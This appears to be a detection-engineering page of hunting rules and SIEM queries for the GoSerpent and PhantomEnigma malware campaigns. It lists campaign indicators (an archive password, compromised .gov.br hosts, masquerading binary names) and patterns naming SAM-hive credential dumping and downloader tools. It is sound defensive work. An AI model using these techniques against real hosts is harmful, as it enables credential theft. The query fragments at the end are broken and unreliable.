Hunts ThumbcacheService's 7-Zip archiving stage, which packs collected documents into password-protected archives using the fixed password @vx0a9n5W2M0c3D6.# with a 20MB volume limit. The password string is a unique campaign artifact, so any command line containing it is effectively a signature regardless of the archiver binary name. Rationale: The password @vx0a9n5W2M0c3D6.# is a verbatim campaign string with effectively zero legitimate use; matching its alphanumeric core (vx0a9n5W2M0c3D6) survives quoting/escaping and catches renamed 7z binaries. Cross-checked against: • https://securelist.com/goserpent-backdoor-in-southeast-asia/120687/
ATT&CKT1560.001 T1074.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Analyst re-running the sample's archive command during malware analysis on a lab host
  • Threat-intel/IR playbook that references the password string in a script comment for testing detections
  • Purple-team exercise emulating GoSerpent's archiving stage
Response runbook
1) Triage: confirm the archiver binary (7z.exe/7za.exe or a renamed copy) and the target file set; look for the -v20m volume flag and the source documents being packed. 2) Contain: isolate the host, preserve the produced archives, and block outbound to any network share the archives were destined for. 3) Hunt: locate thumbcache_605a.db on the same host, review the credential-dumping activity that supplied the share credentials, and check network-share write events for exfiltration of the archives.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has "vx0a9n5W2M0c3D6"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, SHA256, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where CommandLine has "vx0a9n5W2M0c3D6"
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

GoSerpent/McMx masquerading proxy binaries lass.exe and updates.exe AIInstallation High
Hunts execution of GoSerpent's masquerading binaries lass.exe (mimicking lsass.exe) and updates.exe, which host the SOCKS5 proxy/RAT. lass.exe is never a legitimate Windows binary, and updates.exe running from user-writable/staging directories is a strong anomaly for this campaign. Rationale: lass.exe and updates.exe are named verbatim in the article (code blocks) as GoSerpent's process-masquerading filenames; lass.exe has no legitimate counterpart and the path constraint on updates.exe filters the common legitimate updater binaries. Cross-checked against: • https://securelist.com/goserpent-backdoor-in-southeast-asia/120687/
ATT&CKT1036.005 T1090.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimate third-party application shipping its own updates.exe from ProgramData/AppData (e.g. some auto-updaters)
  • Developer/test binary coincidentally named lass.exe in a source tree
  • Software packaging or installer temp extraction dropping an updates.exe into a Temp directory
  • Portable app launched from a USB/Public share named updates.exe
Suppression filter
| where not (FileName =~ "updates.exe" and InitiatingProcessFileName in~ ("msiexec.exe","setup.exe"))
Response runbook
1) Triage: pull the SHA256 and signer of the process; unsigned lass.exe or a Go-compiled updates.exe from a user-writable path is high-confidence. Check for a listening socket / SOCKS5 behavior and outbound C2 from the same PID. 2) Contain: isolate the host, kill the process, and block the associated C2 IPs at the perimeter. 3) Hunt: search for ThumbcacheService staging (thumbcache_605a.db), the 7-Zip archive password, and credential-dumping tools deployed by the same backdoor across the environment.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where AccountName !endswith "$"
| where FileName =~ "lass.exe"
    or (FileName =~ "updates.exe" and FolderPath has_any (@"\Users\Public\", @"\Temp\", @"\ProgramData\", @"\AppData\"))
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, SHA256, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where TargetProcessName endswith @"\lass.exe" or TargetProcessName =~ "lass.exe"
    or ((TargetProcessName endswith @"\updates.exe" or TargetProcessName =~ "updates.exe") and TargetProcessName has_any (@"\Users\Public\", @"\Temp\", @"\ProgramData\", @"\AppData\"))
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine, ParentProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

GoSerpent QuarksDumpLocalHash / SAM hive local hash extraction AIActions on Objectives Medium
Hunts the QuarksDumpLocalHash tool GoSerpent deploys to extract local account password hashes from the SAM registry hive for offline cracking, plus the equivalent reg.exe SAM/SECURITY hive save. This is distinct from LSASS memory access and targets the on-disk SAM credential store. Rationale: Anchored on the named tool QuarksDumpLocalHash and its documented SAM-hive extraction behavior; the reg.exe hive-save branch catches the same TTP if the operator uses a LOLBin instead of the custom tool, and it deliberately avoids overlapping the existing LSASS-access detection. Cross-checked against: • https://securelist.com/goserpent-backdoor-in-southeast-asia/120687/
ATT&CKT1003.002
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Sysadmin exporting a SAM/SECURITY hive for legitimate password-audit or migration tooling
  • Endpoint hardening/audit software (e.g. compliance scanners) reading local hive backups
  • IR/forensics collection scripts that reg save HKLM\SAM for evidence
  • Backup software snapshotting registry hives
Suppression filter
| where InitiatingProcessFileName !in~ ("forensic_collector.exe","psexec.exe") and not (InitiatingProcessFileName =~ "cmd.exe" and InitiatingProcessCommandLine has "backup")
Response runbook
1) Triage: confirm the parent process and account; a hive save or quarks* binary spawned by an unknown Go backdoor (lass.exe/updates.exe) rather than an admin session is high-confidence. Check whether the resulting hive/hash output was written to a staging path. 2) Contain: isolate the host, force-reset local account passwords (and any domain accounts used interactively), and revoke cached credentials. 3) Hunt: correlate with ThumbcacheService staging and network-share writes — the dumped credentials are used to authenticate to shares for exfiltration; review share-access logs for the affected accounts.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where AccountName !endswith "$"
| where FileName has "quarks" or ProcessCommandLine has "QuarksDumpLocalHash"
    or (FileName =~ "reg.exe" and ProcessCommandLine has "save" and ProcessCommandLine has_any (@"hklm\sam", @"hklm\security"))
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, SHA256, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName has "quarks" or CommandLine has "QuarksDumpLocalHash"
    or (NewProcessName endswith @"\reg.exe" and CommandLine has "save" and (CommandLine has @"hklm\sam" or CommandLine has @"hklm\security"))
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] PhantomEnigma police-themed phishing via compromised .gov.br mailboxes and lookalike domains · [LLM] PhantomEnigma delivery-host callout to compromised/lookalike .gov.br installers · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · Article-specific behavioural hunt — 20+ Hijacked Government Websites Became an Attack Channel
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] PhantomEnigma patched Electron/Boostnote index.js backdoor Run-key persistence · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] PhantomEnigma backdoor ~180-second C2 beacon from Electron/Node process · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
PhantomEnigma police-themed phishing via compromised .gov.br mailboxes and lookalike domains AIDelivery Medium
Hunts inbound emails carrying PhantomEnigma's Brazilian police lures ('Ofício Polícia Civil', 'Procuração Digital') or links to the campaign's compromised/lookalike .gov.br delivery hosts. Because the mails are sent from compromised mailboxes and pass SPF/DKIM/DMARC, this pivots on lure content and destination host rather than auth failure. Rationale: Uses the article's exact Portuguese lure titles ('Ofício Polícia Civil'/'Procuração Digital') and the named compromised/lookalike .gov.br hosts as URL-domain IOCs; auth-pass mails from compromised mailboxes defeat SPF/DKIM checks, so content+destination pivots are the only reliable signal. Sentinel left empty: this tenant's provided Sentinel schema has no EmailEvents/message-tracking equivalent. Cross-checked against: • https://thehackernews.com/2026/07/20-hijacked-government-websites.html • https://any.run/cybersecurity-blog/phantomenigma-malware-analysis/
ATT&CKT1566.002 T1584.001
Data sourcesEmail
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate correspondence from genuinely-run pea-sp.gov.br / camara* municipal portals to citizens
  • Brazilian legal/notary firms emailing real 'Procuração Digital' power-of-attorney documents
  • News/press aggregation mailboxes forwarding gov.br links
  • Internal SOC/phishing-simulation exercises using police themes
Suppression filter
| where not (SenderFromDomain endswith ".gov.br" and DeliveryAction == "Delivered" and isempty(Url) and Subject !has_any (lures))
Response runbook
1) Triage: pull the full message via NetworkMessageId — inspect SenderMailFromDomain vs SenderFromDomain, the AuthenticationDetails, and whether the URL redirects to an installer (Inno/MSI). 2) Contain: soft-delete/quarantine matching mails tenant-wide (EmailPostDelivery), block the delivery host at the proxy, reset any internal mailbox seen sending these. 3) Hunt: for every recipient who clicked, pivot to DeviceProcessEvents/DeviceNetworkEvents for Boostnote/node.exe execution and ~180s beacons (see companion UCs).
let lures = dynamic(["Ofício Polícia Civil","Oficio Policia Civil","Procuração Digital","Procuracao Digital","Polícia Civil","Ofício"]);
let badDomains = dynamic(["timon.ma.gov.br","loginam.sesp.es.gov.br","aplicacao.cbm.mt.gov.br","prodoc.ap.gov.br","pea-sp.gov.br","furusepot-pe.gov.br","prefeituraspcd-sp.gov.br","camaradelessedce.mg.gov.br","camarapiguaeu-sp.gov.br"]);
EmailEvents
| where Timestamp > ago(30d)
| where EmailDirection == "Inbound"
| join kind=leftouter (EmailUrlInfo | project NetworkMessageId, Url, UrlDomain) on NetworkMessageId
| where UrlDomain has_any (badDomains) or Subject has_any (lures)
| project Timestamp, NetworkMessageId, SenderFromAddress, SenderMailFromDomain, RecipientEmailAddress, Subject, Url, UrlDomain, DeliveryAction, AuthenticationDetails
| order by Timestamp desc

PhantomEnigma delivery-host callout to compromised/lookalike .gov.br installers AIDelivery High
Detects endpoints resolving or connecting to the specific compromised municipal, public-security and judicial .gov.br hosts (and police-themed lookalikes) PhantomEnigma abuses as trusted redirect/installer staging. These legitimate-looking portals are the delivery infrastructure that fetches the Inno/MSI installer. Rationale: Keys on the exact compromised/lookalike .gov.br hostnames named in the article as delivery infrastructure — these are specific FQDNs, so a match is high-fidelity. IPs from the IOC set were deliberately dropped: several fall in Microsoft/Azure/Akamai ranges (40.126.31.128, 204.79.197.203, 88.221.169.205) and would generate FPs as standalone indicators. Cross-checked against: • https://thehackernews.com/2026/07/20-hijacked-government-websites.html • https://any.run/cybersecurity-blog/phantomenigma-malware-analysis/
ATT&CKT1584.001 T1105
Data sourcesWeb Network_Resolution.DNS
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Brazilian public-sector employees legitimately using the genuine loginam.sesp.es.gov.br / prodoc.ap.gov.br portals for daily work
  • Citizens accessing camara* municipal-council sites for public records
  • Security researchers detonating PhantomEnigma samples in a lab pointed at prod telemetry
  • Uptime/availability monitoring probing these gov portals
Response runbook
1) Triage: confirm which process made the request (InitiatingProcessFileName) and whether a file download followed within 60s (DeviceFileEvents FileOriginUrl). 2) Contain: block the host at proxy/DNS sinkhole, isolate the endpoint if an installer (.exe/.msi) landed in Downloads/Temp. 3) Hunt: search the same device for Boostnote.exe/node.exe execution, HKCU Run persistence, and ~180s outbound beacons; sweep the org for other endpoints resolving the same host list.

PhantomEnigma patched Electron/Boostnote index.js backdoor Run-key persistence AIInstallation Medium
Hunts the backdoor's persistence step — a HKCU ...\CurrentVersion\Run value written to autostart the patched Electron host (Boostnote) whose app.asar index.js was replaced with the modular backdoor. Boostnote is a discontinued niche note app; its autostart entry in an enterprise is itself suspicious. Rationale: Uses the article's named host app (patched Boostnote) and the malicious index.js payload plus the login-settings persistence behavior; Electron's setLoginItemSettings writes exactly this HKCU Run value, so the (Run key + Boostnote/index.js) pair is a tight article-specific signal. Boostnote is EOL, lowering baseline noise. Cross-checked against: • https://thehackernews.com/2026/07/20-hijacked-government-websites.html • https://any.run/cybersecurity-blog/phantomenigma-malware-analysis/
ATT&CKT1547.001 T1554
Data sourcesEndpoint.Registry
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A developer who legitimately installed the discontinued Boostnote note app and enabled launch-on-login
  • Unrelated Electron apps whose Run value literally contains 'index.js' in a debug/dev launch string
  • Software-packaging/SCCM test images that register Boostnote autostart
  • Portable-app launchers that autostart from AppData
Suppression filter
| where not (InitiatingProcessFileName in~ ("ccmexec.exe","msiexec.exe") and DeviceName has "BUILD")
Response runbook
1) Triage: read RegistryValueData for the full launch path — confirm it points into %AppData%/%LocalAppData% and which app.asar/index.js it invokes; check the writing process (InitiatingProcessFileName = installer or electron). 2) Contain: remove the Run value, quarantine the Boostnote install directory, isolate host. 3) Hunt: extract and review the patched index.js for eval()/beacon logic, then pivot to the ~180s C2 beacon UC and the machine-ID/campaign-tag file dropped beside the installer.
DeviceRegistryEvents
| where Timestamp > ago(30d)
| where ActionType in ("RegistryValueSet","RegistryKeyCreated")
| where RegistryKey has @"\CurrentVersion\Run"
| where RegistryValueData has "Boostnote" or (RegistryValueData has @"\AppData\" and RegistryValueData has "index.js")
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, InitiatingProcessAccountName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImRegistryEvent
| where TimeGenerated > ago(30d)
| where RegistryKey has @"\CurrentVersion\Run"
| where RegistryValueData has "Boostnote" or (RegistryValueData has @"\AppData\" and RegistryValueData has "index.js")
| project TimeGenerated, DvcHostname, ActorUsername, RegistryKey, RegistryValue, RegistryValueData, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

id: c3d9b471-2e5a-4f18-a6b3-7c1e0d9a4f22
description: A HKCU Run value referencing Boostnote or an AppData index.js path, matching PhantomEnigma's patched-Electron backdoor persistence.

PhantomEnigma backdoor ~180-second C2 beacon from Electron/Node process AICommand & Control Medium
Detects the modular backdoor's command-poll behavior — a patched Electron/Node process beaconing to public infrastructure on a regular ~180-second cadence ('check for new commands every 180 seconds'). Targets node.exe / electron.exe / Boostnote.exe making sustained, evenly-spaced outbound connections a note-taking app has no reason to make. Rationale: Encodes the article's concrete 180-second command-poll cadence (>=8 distinct 3-minute bins ≈ regular beaconing) combined with the named patched-Electron host processes (Boostnote/Node.js); a note app beaconing on a fixed interval to public IPs is high-signal. Rotating C2 defeats static IP blocklists, so this pivots on process+periodicity, not a fixed destination. Cross-checked against: • https://thehackernews.com/2026/07/20-hijacked-government-websites.html • https://any.run/cybersecurity-blog/phantomenigma-malware-analysis/
ATT&CKT1071.001 T1573
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A legit Electron app doing genuine 3-minute update/telemetry polling
  • node.exe running a local dev server or CI agent polling an external API on a schedule
  • Boostnote's own (legacy) cloud-sync heartbeat if the real app is in use
  • Corporate software with fixed-interval license/heartbeat check-ins
Suppression filter
| where not (InitiatingProcessFolderPath has @"\Program Files\" and RemoteIP has_prefix "20.")
Response runbook
1) Triage: confirm the process image path (AppData vs Program Files) and pull the destination — resolve WHOIS/ASN and check against the compromised .gov.br host list and known-good update endpoints. 2) Contain: isolate the endpoint, block the C2 IP/domain, capture the process memory and the patched index.js. 3) Hunt: decode the beacon format, look for eval()-driven second-stage downloads (DeviceFileEvents .exe drops), and sweep for the same process→interval pattern org-wide since C2 rotates.
DeviceNetworkEvents
| where Timestamp > ago(24h)
| where RemoteIPType == "Public"
| where InitiatingProcessFileName in~ ("node.exe","electron.exe","Boostnote.exe")
| summarize ConnCount = count(), BeaconWindows = dcount(bin(Timestamp, 3m)), FirstSeen = min(Timestamp), LastSeen = max(Timestamp) by DeviceName, InitiatingProcessFileName, RemoteIP, RemotePort
| where ConnCount >= 10 and BeaconWindows >= 8   // ~180s cadence sustained over >=24 min
| order by ConnCount desc
ImNetworkSession
| where TimeGenerated > ago(24h)
| where NetworkDirection == "Outbound" or isempty(NetworkDirection)
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(), BeaconWindows = dcount(bin(TimeGenerated, 3m)), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by SrcIpAddr, SrcHostname, DstIpAddr, DstPortNumber
| where ConnCount >= 10 and BeaconWindows >= 8   // ~180s cadence sustained over >=24 min
| order by ConnCount desc
source:windows.sysmon @EventID:3 @Image:(*\\node.exe OR *\\Node.exe OR *\\electron.exe OR *\\Electron.exe OR *\\Boostnote.exe OR *\\boostnote.exe) NOT (CIDR(@DestinationIp, 10.0.0.0/8) OR CIDR(@DestinationIp, 172.16.0.0/12) OR CIDR(@DestinationIp, 192.168.0.0/16))
#event_simpleName=NetworkConnectIP4 ContextImageFileName=/(node|electron|boostnote)\.exe$/i
| NOT cidr("10.0.0.0/8", field=RemoteAddressIP4)
| NOT cidr("172.16.0.0/12", field=RemoteAddressIP4)
| NOT cidr("192.168.0.0/16", field=RemoteAddressIP4)
| groupBy([aid, ComputerName, ContextImageFileName, RemoteAddressIP4, RemotePort], function=count())
| _count > 10
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count as conn_count dc(_time) as distinct_secs min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where (All_Traffic.app="node.exe" OR All_Traffic.process="*node.exe" OR All_Traffic.process="*electron.exe" OR All_Traffic.process="*Boostnote.exe") All_Traffic.dest_is_internal=false by All_Traffic.src All_Traffic.process All_Traffic.dest All_Traffic.dest_port span=3m | `drop_dm_object_name(All_Traffic)` | stats count as beacon_windows sum(conn_count) as total_conns min(firstTime) as firstTime max(lastTime) as lastTime by src process dest dest_port | where beacon_windows >= 8 AND total_conns >= 10 | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count as conn_count dc(_time) as distinct_secs min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where (All_Traffic.app="node.exe" OR All_Traffic.process="*node.exe" OR All_Traffic.process="*electron.exe" OR All_Traffic.process="*Boostnote.exe") All_Traffic.dest_is_internal=false by All_Traffic.src All_Traffic.process All_Traffic.dest All_Traffic.dest_port span=3m | `drop_dm_object_name(All_Traffic)` | stats count as beacon_windows sum(conn_count) as total_conns min(firstTime) as firstTime max(lastTime) as lastTime by src process dest dest_port | where beacon_windows >= 8 AND total_conns >= 10 | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

    from datamodel=Email.All_Email

| rename All_Email.recipient as user

    [| tstats `summariesonly` count
        from datamodel=Endpoint.Processes

          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
        by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
     | rename Processes.user as user]
| tstats summariesonly=false count

